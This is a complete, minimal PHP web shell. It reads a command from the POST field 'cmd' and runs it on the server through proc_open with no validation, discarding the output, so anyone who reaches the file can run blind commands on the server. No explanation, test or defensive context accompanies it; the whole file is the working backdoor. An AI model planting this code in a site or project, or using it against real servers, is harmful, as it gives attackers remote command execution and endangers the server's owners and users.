<?php
$command = $_POST['cmd'];
$descriptorspec = array(
			   0 => array('pipe', 'r'),
			   1 => array('pipe', 'w'),
			   2 => array('pipe', 'w')
			);
$process = proc_open($command, $descriptorspec, $pipes);
if (is_resource($process)) {
	fclose($pipes[0]);
	fclose($pipes[1]);
	fclose($pipes[2]);
	proc_close($process);
}
?>